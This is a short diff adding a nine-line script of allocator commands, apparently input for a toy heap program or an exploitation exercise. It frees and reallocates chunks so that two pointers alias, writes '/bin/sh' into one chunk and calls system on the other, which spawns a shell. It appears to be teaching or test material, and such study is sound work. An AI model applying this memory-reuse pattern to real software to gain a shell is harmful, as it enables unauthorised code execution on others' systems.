@@ -1,0 +1,9 @@
+malloc a # optional
+malloc b
+free b
+free a
+malloc b
+# now a == b
+write /bin/sh to a
+system b
+
